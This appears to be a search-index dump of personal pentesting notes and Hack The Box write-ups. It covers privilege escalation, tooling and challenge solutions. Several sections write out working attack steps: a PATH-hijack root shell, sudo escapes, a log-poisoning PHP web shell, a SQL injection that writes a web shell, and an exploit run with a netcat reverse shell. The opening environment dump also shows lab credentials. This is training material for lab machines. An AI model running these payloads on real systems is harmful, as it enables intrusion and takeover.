LANGUAGE=en_US:en MB_JETTY_HOST=0.0.0.0 JAVA_HOME=/opt/java/openjdk MB_DB_FILE=//metabase.db/metabase.db PWD=/metabase.db LOGNAME=metabase MB_EMAIL_SMTP_USERNAME= HOME=/home/metabase LANG=en_US.UTF-8 META_USER=metalytics META_PASS=An4lytics_dsXXXX# MB_EMAIL_SMTP_PASSWORD= USER=metabase SHLVL=4 MB_DB_USER= FC_LANG=en-US LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib LC_CTYPE=en_US.UTF-8 MB_LDAP_BIND_DN= LC_ALL=en_US.UTF-8 MB_LDAP_PASSWORD= PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin MB_DB_CONNECTION_URI= JAVA_VERSION=jdk-11.0.19+7 _=/usr/bin/env OLDPWD=/   ","version":"Next","tagName":"h3"},{"title":"Privilege escalation​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#privilege-escalation","content":" This step is gaining access to the root or Administrator user of the machine. Once we do that, we can do whatever we want with that machine. The topic is very broad and this section only provides a summary of things to watch out.  ","version":"Next","tagName":"h2"},{"title":"Windows​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#windows","content":" You can use https://github.com/carlospolop/PEASS-ng. You need to run the executable file in the target Windows machine. The script will identify the possible vulnerabilities to exploit and gain admin access.  It might be possible that the password of the admin user has been pasted in the history of the shell. Check the output of winpeas for references to ConsoleHost_history.txt file.  Another interesting path to privilege escalation is to check the permissions of a file. In order to do so, run icacls command. (F) means Full access and is a promising way of privilege escalation.  ","version":"Next","tagName":"h3"},{"title":"Linux​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#linux","content":" Hidden files​  Once you got foothold to a server and if you need to perform lateral movement or privilege escalation, most of the times, there will be some hidden configuration file worth exploring. Remember to set the flags to ls to check the hidden files:  ls -lisa   Check accessible folders​  Check what's in the following directories:  /home/user/var/xxxx/etc/xxx  e.g. in Artificial machine, there was an accessible file in /var/logs which was the key to resolve the machine.  Sudo​  You can check if the user can run sudo command and with which privileges or restrictions by running:  jack@clicker:~$ sudo -l Matching Defaults entries for jack on clicker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User jack may run the following commands on clicker: (ALL : ALL) ALL (root) SETENV: NOPASSWD: /opt/monitor.sh   NOPASSWD: means the user can execute the program without password as root.SETENV: means the user can set environment variables running the program as root.  SUID​  If you see some entry that allows the user to execute a binary as superuser you can check the file flags and permissions by running:  ls -lisa /usr/bin/bugtracker 264151 12 -rwsr-xr-- 1 root bugtracker 8792 Jan 25 2020 /usr/bin/bugtracker   The 's' in the result is the sticky bit in the file permissions.  file /usr/bin/bugtracker /usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped   The setuid permission is the sticky bit representation in the file command output.  That is a special permission named SUID or Set Owner User ID. SUID allows an alternate user to run an executable with the same permissions as the owner of the file instead of the permissions of the alternate user. That looks promising for privilede escalation.  In our case, the binary 'bugtracker' is owned by root &amp; we can execute it as root since it has SUID set.  If we execute the app, we can see that is asking for input. On invalid input it shows an error showing that it's using cat command:  robert@oopsie:/var/www/html$ bugtracker 12 bugtracker 12 ------------------ : EV Bug Tracker : ------------------ Provide Bug ID: 12 12 --------------- cat: /root/reports/12: No such file or directory   Looks like it's not using the full path of the cat tool. We can create a executable named cat and put it before in PATH and it will execute that cat (/tmp/cat) instead of the real cat:  echo &quot;/bin/sh&quot; &gt; /tmp/cat robert@oopsie:/var/www/html$ export PATH=/tmp:$PATH robert@oopsie:/var/www/html$ echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games robert@oopsie:/var/www/html$ bugtracker bugtracker ------------------ : EV Bug Tracker : ------------------ Provide Bug ID: 12 12 --------------- whoami root   and we have root access.  You can try to find all the files that has the suid flag set:  find / -perm -u=s -type f 2&gt;/dev/null   GTFObins​  If sudo -l shows permission for any binary, check https://gtfobins.github.io for a way to exploit the binary to gain root access.  E.g.: you can get root access with vim. If the user has sudo access to edit some file, you can abuse it to get root access:  vi :set shell=/bin/sh :shell   Check write access to PATH​  Check if you can write to some path in the PATH variable  import os paths = os.environ[&quot;PATH&quot;].split(&quot;:&quot;) for path in paths: writetable=True filename=f&quot;{path}/a&quot; try: with open(filename, &quot;w&quot;) as file1: file1.write(&quot;Hello&quot;) except Exception: writetable=False if writetable: os.system(f&quot;rm {filename}&quot;) print(path +&quot; ... &quot;+str(writetable))   Check open ports​  Might be interesting to what ports are listening in the server, you might find something vulnerable listening only in localhost for example.  netstat -tunap |grep &quot;LISTEN&quot;   Kernel version​  Search OS version and kernel for CVEs:  uname -a Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux   If we look in Google for 6.2.0-25-generic #25~22.04.2-Ubuntu CVE you'll see this link: https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability and this link https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629 ","version":"Next","tagName":"h3"},{"title":"redis","type":0,"sectionRef":"#","url":"/docs/tooling/redis","content":"redis Redis is an in-memory key-value (NoSQL) database running on 6379 port by default To connect to the database, we must use redis-cli: redis-cli -h &lt;ip&gt; Once inside we can retrieve more information by using the info command: &lt;ip&gt;:6379&gt; info # Server redis_version:5.0.7 redis_git_sha1:00000000 redis_git_dirty:0 redis_build_id:66bd629f924ac924 redis_mode:standalone os:Linux 5.4.0-77-generic x86_64 arch_bits:64 To enumerate the database with some entries, we can use the info keyspace command. This information is present in the info response as well. To retrieve all the keys in a given database, we can use the keys * command once we have selected the database. To access a particular key, we use the get command: redis-cli -h &lt;ip&gt; &lt;ip&gt;:6379&gt; select 0 OK &lt;ip&gt;:6379&gt; keys * 1) &quot;numb&quot; 2) &quot;temp&quot; 3) &quot;flag&quot; 4) &quot;stor&quot; &lt;ip&gt;:6379&gt; keys flag 1) &quot;flag&quot; &lt;ip&gt;:6379&gt; get flag &quot;flag&quot; ","keywords":"","version":"Next"},{"title":"responder","type":0,"sectionRef":"#","url":"/docs/tooling/responder","content":"responder https://github.com/lgandx/Responder For getting NTLM password, responder tool will setup a rogue SMB server that will capture the challenge initiated by another machine in the network and store the hash of the challenge. Later you can use hashcat or john to try to go from hash to password. sudo responder -I tun0 ","keywords":"","version":"Next"},{"title":"rsa-ctf-tool","type":0,"sectionRef":"#","url":"/docs/tooling/rsa-ctf-tool","content":"rsa-ctf-tool https://github.com/RsaCtfTool/RsaCtfTool Is a tool to check/attack RSA keys. I have used it to retrieve a private key from a weak RSA public key. The key pair are generated by multiplying two prime numbers, if the prime numbers are not big enough, they can be guessed and reveal the private key. To decypher the file encrypted with the private key use openssl: openssl rsautl -in flag.enc -out flag.txt -decrypt -inkey key.priv To know the length of the RSA: openssl rsa -in key.pub --RSAPublicKey_in -text -noout openssl rsa -in key.priv -text -noout ","keywords":"","version":"Next"},{"title":"rsync","type":0,"sectionRef":"#","url":"/docs/tooling/rsync","content":"rsync rsync is a tool to share files between Linux machines, it defaults to SSH port (22) or 873. With rsync:// will use 873 port while the form user@host will use the SSH port To list all the rsync shares: rsync --list-only rsync://&lt;ip&gt; public Anonymous Share ","keywords":"","version":"Next"},{"title":"smbclient","type":0,"sectionRef":"#","url":"/docs/tooling/smbclient","content":"smbclient Stands for Server Message Block and is a protocol for file sharing between computers. It runs on port 445 by default. The command line tool to interact with it, it's smbclient. To list shared directories (use -N for anonymous access): smbclient -L \\\\&lt;ip&gt; -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC WorkShares Disk SMB1 disabled -- no workgroup available Note the \\\\ prefix, this comes from Windows slahes. Make sure to pass the --user flag, otherwise it will try to connect using your Linux user: smbclient -L \\\\10.129.68.251 --user=&quot;Administrator&quot; Password for [WORKGROUP\\Administrator]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC Now, let's connect to the shared: smbclient \\\\\\\\&lt;ip&gt;\\\\WorkShares Enter WORKGROUP\\gal's password: Try &quot;help&quot; to get a list of possible commands. smb: \\&gt; When you're connected to the smb server you can use the same commands as in FTP. If you see this error: protocol negotiation failed: NT_STATUS_NOT_SUPPORTED, you need to configure min/max protocol versions, see: https://unix.stackexchange.com/questions/562550/smbclient-protocol-negotiation-failed We can download files with get and mget (for multiples files)","keywords":"","version":"Next"},{"title":"telnet","type":0,"sectionRef":"#","url":"/docs/tooling/telnet","content":"telnet Telnet is a very old way of connecting to computer and by default listens on port 23. Usage: telnet &lt;ip&gt; The prompty will ask for user/password: telnet &lt;ip&gt; Trying &lt;ip&gt;... Connected to &lt;ip&gt;. Escape character is '^]'. █ █ ▐▌ ▄█▄ █ ▄▄▄▄ █▄▄█ ▀▀█ █▀▀ ▐▌▄▀ █ █▀█ █▀█ █▌▄█ ▄▀▀▄ ▀▄▀ █ █ █▄█ █▄▄ ▐█▀▄ █ █ █ █▄▄ █▌▄█ ▀▄▄▀ █▀█ Meow login: root ","keywords":"","version":"Next"},{"title":"wesg","type":0,"sectionRef":"#","url":"/docs/tooling/wesg","content":"wesg https://github.com/bitsadmin/wesng Checks for Windows vulnerabilities given the output of a systeminfo command.","keywords":"","version":"Next"},{"title":"Useful links","type":0,"sectionRef":"#","url":"/docs/useful-links","content":"Useful links Name\tDescription\tLinkpentestbook.six2dez.com\tGeneral guides on pentesting\thttps://pentestbook.six2dez.com/ revshells\tList of reverse shells\thttps://www.revshells.com Hacktricks\tUseful for everything related with pentesting\thttps://book.hacktricks.xyz/welcome/readme SecLists\tWordlists and stuff\thttps://github.com/danielmiessler/SecLists Reverse shells\tMore reverse shells payloads\thttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md Pentestmonkey\tAnother pentesting guide\thttps://pentestmonkey.net/ GTFOBins\tList of UNIX binaries that can be used to bypass local security restrictions\thttps://gtfobins.github.io/ LOLbas\tSimilar to GTFObins but for Windows\thttps://lolbas-project.github.io/ Red team notes\tRed team notes\thttps://www.ired.team/ SQL injections\tSQL injections\thttps://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/ CVE mitre\tSearch for CVEs\thttps://cve.mitre.org/cve/search_cve_list.html Request repo\tTool to receive HTTP request and display data\thttps://requestrepo.com/ CTF 101\tCTF theory\thttps://ctf101.org/","keywords":"","version":"Next"},{"title":"File inclusion","type":0,"sectionRef":"#","url":"/docs/write-up/htb-academy/file-inclusion","content":"File inclusion This is the write-up for the assessment of HTB academy File inclusion module. This a little bit tricky because we know which vulnerability to exploit here: file inclusion. whatweb 94.237.49.11:31840/index.php http://94.237.49.11:31840/index.php [200 OK] Bootstrap, Country[FINLAND][FI], HTML5, HTTPServer[nginx/1.18.0], IP[94.237.49.11], JQuery[3.3.1], PHP[7.3.22], Script, Title[InlaneFreight], X-Powered-By[PHP/7.3.22], nginx[1.18.0] whatweb reveals we're dealing with a PHP/7.3.22 page served by an nginx/1.18.0. While navigating as a regular user in the website, we can see the URL has a page parameter which looks promising for LFI vulnerability. Visiting http://94.237.49.11:31840/index.php?page=industries../ shows Invalid input detected! which is the contents of error.php page. Let's try the basic bypasses: Double the input: ./ become ..//. NothingURL encode the symbols: nothingTry to escape the approve path: N/A because the pages are in rootPath truncation: N/A PHP version is recentNull byte: N/A PHP version is recent Let's try with more complex bypasses: http://94.237.49.11:31840/index.php?page=php://filter/read=convert.base64-encode/resource=main Worked and return the content of the main.php in base64 In index.php we discover a commented piece of code that makes reference to ilf_admin/index.php. If we try to access that page, we get something interesting showing some logs. Worth remembering: http://94.237.49.11:31840/ilf_admin/index.php?log=system.log The filtering mechanism looks quite simple: $page = $_GET['page']; if (strpos($page, &quot;..&quot;) !== false) { include &quot;error.php&quot;; } else { include $page . &quot;.php&quot;; } http://94.237.49.11:31840/index.php?page=%252e%252e%252fetc%252fpasswd Looks like might be vulnerable to double encoding, however we're only bypassing the first if and the include only let us include php files. Let's get back to http://94.237.49.11:31840/ilf_admin/index.php We can try to brute-force some directories: ffuf -w /opt/github/SecLists/Discovery/Web-Content/combined_directories.txt:FUFF -u http://94.237.49.11:31840/ilf_admin/FUFF.php ffuf -w /opt/github/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.49.11:31840/ilf_admin/index.php?FUZZ=value' -fl 102 Nothing revealed. However, we can try the LFI directly in the log paramter: http://94.237.49.11:31840/ilf_admin/index.php?log=../../error.php and it worked! http://94.237.49.11:31840/ilf_admin/index.php?log=../../../../../etc/passwd we have read the passwd file! In order to have Remote Code Excecution, let's try to see if we can have Remote File Inclusion and add our shell. We cannot include Remote files, checking the nginx error log, looks like they might be using file_get_contents or something like this. Given we have access to logs, we can poison them and force ilf_admin to execute them by setting the user-agent of curl: curl -s &quot;http://94.237.59.185:42603/index.php&quot; -A &quot;&lt;?php system($_GET['cmd']); ?&gt;&quot; And now we have a web shell running in the logs page: http://94.237.59.185:42603/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&amp;cmd=id From here we can move to a reverse shell","keywords":"","version":"Next"},{"title":"Getting started","type":0,"sectionRef":"#","url":"/docs/write-up/htb-academy/getting-started","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Getting started","url":"/docs/write-up/htb-academy/getting-started#enumeration","content":" The machine has open ports in 22 and 80  SSH banner: OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0  There's an apache webserver in 80:  PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Welcome to GetSimple! - gettingstarted |_http-server-header: Apache/2.4.41 (Ubuntu) | http-robots.txt: 1 disallowed entry |_/admin/   └──╼ $whatweb http://10.129.235.190/ http://10.129.235.190/ [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.235.190], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]   From the previous scans we can see it's using the GetSimple cms.  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Getting started","url":"/docs/write-up/htb-academy/getting-started#foothold","content":" We search the default credentials and admin:admin worked.  Checking the vulnerabilities for the CMS, I found this one https://www.exploit-db.com/exploits/51475.  Then, it's a matter of download the exploit, run it and configure a remote shell using nc:  nc -lvnp 4444   and launch the exploit:  python3 51475.py 10.129.235.190 / 10.10.15.50:4444 admin   And we have foothold onto the machine with www-data user:  nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.15.50] from (UNKNOWN) [10.129.235.190] 52682 id uid=33(www-data) gid=33(www-data) groups=33(www-data)   Now, we just need to improve the shell and retrieve the user flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Getting started","url":"/docs/write-up/htb-academy/getting-started#privilege-escalation","content":" Now, we can escalate privileges. First we check what root permissions have the user:  www-data@gettingstarted:/home/mrb3n$ sudo -l sudo -l Matching Defaults entries for www-data on gettingstarted: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on gettingstarted: (ALL : ALL) NOPASSWD: /usr/bin/php   The user www-data can execute the php binary as root without providing a password. This is a very bad idea. A quick search in GTFObins give a easy payload to get a root shell:  www-data@gettingstarted:/home/mrb3n$ sudo php -r 'system(&quot;/bin/sh&quot;);' sudo php -r 'system(&quot;/bin/sh&quot;);' id id uid=0(root) gid=0(root) groups=0(root)   Now we can retrieve the root flag. ","version":"Next","tagName":"h2"},{"title":"SQL injections","type":0,"sectionRef":"#","url":"/docs/write-up/htb-academy/sqli","content":"","keywords":"","version":"Next"},{"title":"Login page​","type":1,"pageTitle":"SQL injections","url":"/docs/write-up/htb-academy/sqli#login-page","content":" First of all we're given a login page, most likely we'll need to provide a SQLi to bypass the login.  Let's evaluate which fields are vulnerable to SQLi by providing a dangling character, e.g: ' to break the query.  curl -vvv 'http://83.136.251.235:30056/' -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=\\'&amp;password=1234'   We couldn't break any field with the escape characters. We can try some of the pre-defined SQL injections from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-default-databases.  The second one worked fine:  ' OR 1 -- -   and we're presented a dashboard with a search box.  ","version":"Next","tagName":"h2"},{"title":"Search box​","type":1,"pageTitle":"SQL injections","url":"/docs/write-up/htb-academy/sqli#search-box","content":" The search box make a request like:  curl 'http://83.136.251.235:30056/dashboard/dashboard.php' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=t7addrm0eidu7ag6m1e7e31geo' --data-raw 'search=a'   Looks like the search only works to search the values in the date.  We should follow the same approach: let's try to break the search with escape character: ' and it worked, we can see an error.  Let's try to determine the number of columns:  a' UNION SELECT 1,2,3,4 -- -   It shows: The used SELECT statements have a different number of columns  It worked with:  a' UNION SELECT 1,2,3,4,5 -- -   But the first column is not shown  The objective is to install a web-shell, so let's enumerate if we're capable of.  a' UNION SELECT 1,user(),3,4,5 -- -   and we got root@localhost  Let's check privileges:  a' UNION SELECT 1,grantee, privilege_type,4,5 FROM information_schema.user_privileges WHERE grantee=&quot;'root'@'localhost'&quot; -- -   FILE privilege is there.  Check for write file global var:  a' UNION SELECT 1,variable_name, variable_value,4,5 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot; -- -   The variable is not set, so we can write.  Let's try it:  a' UNION SELECT 1,'file written successfully!',3,4,5 into outfile '/var/www/html/dashboard/proof.txt' -- -   Now let's try to read it, before we try to install the shell.  a' UNION SELECT 1,LOAD_FILE('/var/www/html/dashboard/proof.txt'),3,4,5 -- -   We got the contents back, so let's install the shell.  a' UNION select &quot;&quot;,'&lt;?php system($_REQUEST[0]); ?&gt;', &quot;&quot;, &quot;&quot;, &quot;&quot; into outfile '/var/www/html/dashboard/1.php' -- -   And we've got the shell http://83.136.251.235:30056/dashboard/1.php?0=id  Now we list files at root: http://83.136.251.235:30056/dashboard/1.php?0=ls%20/  Now we can retrieve the flag: http://83.136.251.235:30056/dashboard/1.php?0=cat%20/flag_cae1dadcd174.txt ","version":"Next","tagName":"h2"},{"title":"Criticalops","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/critical-ops","content":"Criticalops https://app.hackthebox.com/challenges/Criticalops Criticalops is a web app used to monitor critical infrastructure in the XYZ region. Users submit tickets to report unusual behavior. Please uncover potential vulnerabilities, and retrieve the hidden flag within the system. The first thing we see is a self-signed certificate, which might be interesting to explore. Whatweb reveals it is nextjs: https://94.237.50.221:51712/ [200 OK] Country[FINLAND][FI], HTML5, HTTPServer[nginx/1.26.3], IP[94.237.50.221], Script, Title[CriticalOps - Infrastructure Management], UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time], X-Powered-By[Next.js], nginx[1.26.3] We can register and see dashboards and so on. Cannot do much, just a form to create tickets. This might be a good opportunity for XSS or something related with forms. In the ticket section, we can see a JWT token passed, decoding it we see: { &quot;userId&quot;: &quot;15f0d261-88f0-4092-bbe9-6990b0bf9cfc&quot;, &quot;username&quot;: &quot;test&quot;, &quot;role&quot;: &quot;user&quot;, &quot;iat&quot;: 1754239502, &quot;exp&quot;: 1754268302 } We could try a JWT Confussion attack to be able to modify it maybe. We can modify the token and sign it with the public key because we have the certificate info. We can download the certificate and extract the public key using openssl. curl -k 'https://94.237.54.192:57646/api/tickets' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: /' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H 'Referer: https://94.237.54.192:57646/tickets' -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiJiMTQ1NGQ1ZC1mM2ZmLTQ3ZjItODU4YS1mNDNhODdjNWM1ODMiLCJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidGVzdCIsImlhdCI6MTg1NDMyMTQ2MiwiZXhwIjoxODU0MzUwMjYyfQ.' -H 'Content-Type: application/json' -H 'Connection: keep-alive' -H 'Cookie: authToken=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiJiMTQ1NGQ1ZC1mM2ZmLTQ3ZjItODU4YS1mNDNhODdjNWM1ODMiLCJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidGVzdCIsImlhdCI6MTg1NDMyMTQ2MiwiZXhwIjoxODU0MzUwMjYyfQ.' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' -H 'Priority: u=4' No luck with the confussion attack. Let's check the source code. It looks like the secret to generate the JWT token is included in the source code. We can generate a JWT with role &quot;admin&quot; using the secret and boom, we got the token. Remember, if available, check the code for secrets!","keywords":"","version":"Next"},{"title":"Distract and destroy","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/distract-and-destroy","content":"","keywords":"","version":"Next"},{"title":"Intro to Ethereum​","type":1,"pageTitle":"Distract and destroy","url":"/docs/write-up/htb/challenges/distract-and-destroy#intro-to-ethereum","content":" In Ethereum network, there are two types of accounts:  Externally Owned Account (EOA): human powered that has a private key and can initiate transactionsSmart contract: It is controller by code. Only can respond to calls, cannot initiate transactions and does not have a private key.  When a transaction is made:  EOA Call:  msg.sender = your EOA address tx.origin = your EOA address  Contract Call (via another contract):  You call Contract A (as an EOA), and it calls Contract B.  In Contract B:  msg.sender = Contract A tx.origin = your EOA address  In our case, the first caller set the aggro address:  if (aggro == address(0)) { aggro = msg.sender; }   Life points are only drained if offBalance and the sender is different that the first attacker  if (_isOffBalance() &amp;&amp; aggro != msg.sender) { lifePoints -= _damage; } else { lifePoints -= 0; }   offBalance happens on this case:   function _isOffBalance() private view returns (bool) { return tx.origin != msg.sender; }   tx.origin is transaction origin, since transactions can only be initiated by EOA, this is true only if the call is made from a contract (i.e., not directly from an EOA). So only contract calls (not direct user transactions) can damage the Creature.  So, we need to create two things:  A EOA that calls attack and sets aggro to the EOA. No damage will happen because isOffBalance will be false.A smart contract that calls the attack and drain the life points.  Once the life points are done, we can use the UI to perform the attack and reveal the flag. ","version":"Next","tagName":"h2"},{"title":"Evaluative","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/evaluative","content":"Evaluative https://app.hackthebox.com/challenges/Evaluative A rogue bot is malfunctioning, generating cryptic sequences that control secure data vaults. Your task? Decode its logic and compute the correct output before the system locks you out! This was a weird one. It was more like a programming challenge than a hacking challenge. At the beginning, looks like it was a very easy RCE since we got a Python console. However, after searching for the flag inside the docker container, I couldn't find anything so I switched to analyze the source code. In the source code I found an interesting line: check = requests.post(f'{CHECK_SERVER}/check', json=response).json() first_item = next(iter(results.items())) if check['success']: return jsonify({ 'flag': check['flag'], 'stderr': '', 'input': first_item[0], 'result': first_item[-1] }) Looks like if we got the assignment programmed correctly, we'll retrieve the flag. Extremely easy","keywords":"","version":"Next"},{"title":"Flag command","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/flag-command","content":"Flag command https://app.hackthebox.com/challenges/Flag%20Command Embark on the &quot;Dimensional Escape Quest&quot; where you wake up in a mysterious forest maze that's not quite of this world. Navigate singing squirrels, mischievous nymphs, and grumpy wizards in a whimsical labyrinth that may lead to otherworldly surprises. Will you conquer the enchanted maze or find yourself lost in a different dimension of magical challenges? The journey unfolds in this mystical escape! We're given an IP and port, this is some sort of a web role game. We can inspect the JS code to see the correct decission we need to take. There are three files: commands.js: The definition of the commands, there's the GAME_WON command which probably will reveal the flag.game.jsmain.js In main.js we see calls to an API. The response to display the possible commands is this: { &quot;allPossibleCommands&quot;: { &quot;1&quot;: [ &quot;HEAD NORTH&quot;, &quot;HEAD WEST&quot;, &quot;HEAD EAST&quot;, &quot;HEAD SOUTH&quot; ], &quot;2&quot;: [ &quot;GO DEEPER INTO THE FOREST&quot;, &quot;FOLLOW A MYSTERIOUS PATH&quot;, &quot;CLIMB A TREE&quot;, &quot;TURN BACK&quot; ], &quot;3&quot;: [ &quot;EXPLORE A CAVE&quot;, &quot;CROSS A RICKETY BRIDGE&quot;, &quot;FOLLOW A GLOWING BUTTERFLY&quot;, &quot;SET UP CAMP&quot; ], &quot;4&quot;: [ &quot;ENTER A MAGICAL PORTAL&quot;, &quot;SWIM ACROSS A MYSTERIOUS LAKE&quot;, &quot;FOLLOW A SINGING SQUIRREL&quot;, &quot;BUILD A RAFT AND SAIL DOWNSTREAM&quot; ], &quot;secret&quot;: [ &quot;Blip-blop, in a pickle with a hiccup! Shmiggity-shmack&quot; ] } } Using Firefox developer tools, we can place a breakpoint in the CheckMessage function which is only called when the game is started. In the CheckMessage there's this line: if (availableOptions[currentStep].includes(currentCommand) || availableOptions['secret'].includes(currentCommand)) { If we provide the secret, the frontend will make the call to the API and it will return the secret! Easy!","keywords":"","version":"Next"},{"title":"Low logic","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/low-logic","content":"Low logic https://app.hackthebox.com/challenges/Low%20Logic I have this simple chip, I want you to understand how it's works and then give me the output. A basic analysis treating the transistors as a simple switch will give us what the circuit is doing: i1 AND i2 OR i3 AND i4. Now we can create a python program that reads the input.csv binary input, generate the binary output and then convert the binary sequence to an ASCII sequence that will be the key: import csv bits = [] with open(&quot;./input.csv&quot;, 'r') as fd: reader = csv.reader(fd) next(reader) for row in reader: i1,i2,i3,i4 = map(int,row) o0 = (i1 &amp; i2) | (i3 &amp; i4) bits.append(o0) # Step 1: Group bits into chunks of 8 chunks = [bits[i:i+8] for i in range(0, len(bits), 8)] # Step 2: Convert each chunk to a character ascii_string = ''.join(chr(int(''.join(map(str, chunk)), 2)) for chunk in chunks) print(ascii_string) ","keywords":"","version":"Next"},{"title":"The last dance","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/the-last-dance","content":"The last dance https://app.hackthebox.com/challenges/The%2520Last%2520Dance To be accepted into the upper class of the Berford Empire, you had to attend the annual Cha-Cha Ball at the High Court. Little did you know that among the many aristocrats invited, you would find a burned enemy spy. Your goal quickly became to capture him, which you succeeded in doing after putting something in his drink. Many hours passed in your agency's interrogation room, and you eventually learned important information about the enemy agency's secret communications. Can you use what you learned to decrypt the rest of the messages? We are given two files: out.txtsource.py After reading the source code, we know the contents of out.txt: Initialization vectorEncrypted messageEncrypted flag The encryption is ChaCha20 ChaCha20 is a stream cipher, meaning it encrypts data by XORing the plaintext with a keystream derived from: A keyA nonce/IVA counter (which increments for each block) The keystream is deterministic and only depends on the key and IV (and counter), not the plaintext. So if the same key and IV are reused, the same keystream is reused. In order to retriev the flag, we'lll do the following: Derive the keystream from the encrypted message by doing: keystream = encrypted message XOR plaintext Extract the flag by doing: flag = keystream XOR encrypted flag Remember that for XOR both inputs need to be of the same size!","keywords":"","version":"Next"},{"title":"NeoVault","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/neo-vault","content":"NeoVault https://app.hackthebox.com/challenges/NeoVault Neovault is a trusted banking app for fund transfers and downloading transaction history. You're invited to explore the app, find potential vulnerabilities, and uncover the hidden flag within. We are given access to an instance IP and port. The JS code is bundled with webpack. Let's analyze the app with whatweb: └─$ whatweb 94.237.54.192:34875 http://94.237.54.192:34875 [200 OK] Country[FINLAND][FI], HTML5, HTTPServer[nginx/1.22.1], IP[94.237.54.192], PasswordField[password], Script, Title[NeoVault], UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time], X-Powered-By[Next.js], nginx[1.22.1] A webapp built with nextjs, bundled with webpack. No sourcemaps available This doesn't reveal much. The application does not show much option to interact with, there's only login and create an account. Let's do it! Checking the source code, looks like it's bundled with webpack, we can use prettier to &quot;deofuscate&quot; it: https://prettier.io/playground Checking the code we can find the backend endppoints: let a = { endpointsV1: { me: &quot;/api/v1/auth/me&quot;, login: &quot;/api/v1/auth/login&quot;, register: &quot;/api/v1/auth/register&quot;, logout: &quot;/api/v1/auth/logout&quot;, changeEmail: &quot;/api/v1/auth/change-email&quot;, transactions: &quot;/api/v1/transactions&quot;, deposit: &quot;/api/v1/transactions/deposit&quot;, balanceHistory: &quot;/api/v1/transactions/balance-history&quot;, categoryPercentages: &quot;/api/v1/transactions/categories-spending&quot;, downloadTransactions: &quot;/api/v1/transactions/download-transactions&quot;, }, endpointsV2: { me: &quot;/api/v2/auth/me&quot;, login: &quot;/api/v2/auth/login&quot;, register: &quot;/api/v2/auth/register&quot;, logout: &quot;/api/v2/auth/logout&quot;, changeEmail: &quot;/api/v2/auth/change-email&quot;, transactions: &quot;/api/v2/transactions&quot;, deposit: &quot;/api/v2/transactions/deposit&quot;, balanceHistory: &quot;/api/v2/transactions/balance-history&quot;, categoryPercentages: &quot;/api/v2/transactions/categories-spending&quot;, downloadTransactions: &quot;/api/v2/transactions/download-transactions&quot;, 